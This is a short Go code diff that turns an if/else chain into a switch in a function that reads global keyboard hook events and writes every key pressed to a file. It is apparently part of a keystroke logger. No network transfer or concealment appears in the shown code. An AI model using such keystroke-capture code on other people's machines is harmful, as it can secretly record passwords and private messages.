@@ -18,13 +18,15 @@ func StartEventWriter() {
 	for ev := range events {
 
 		if ev.Kind == hook.KeyHold {
-			if ev.Rawcode == 8 {
+
+			switch ev.Rawcode {
+			case 8:
 				file.WriteString("Backspace\n")
-			} else if ev.Rawcode == 32 {
-				file.WriteString("Space\n")
-			} else if ev.Rawcode == 13 { //change magic num
+			case 13:
 				file.WriteString("Enter\n")
-			} else {
+			case 32:
+				file.WriteString("Space\n")
+			default:
 				text := string(ev.Keychar) + "\n"
 				file.WriteString(text)
 			}
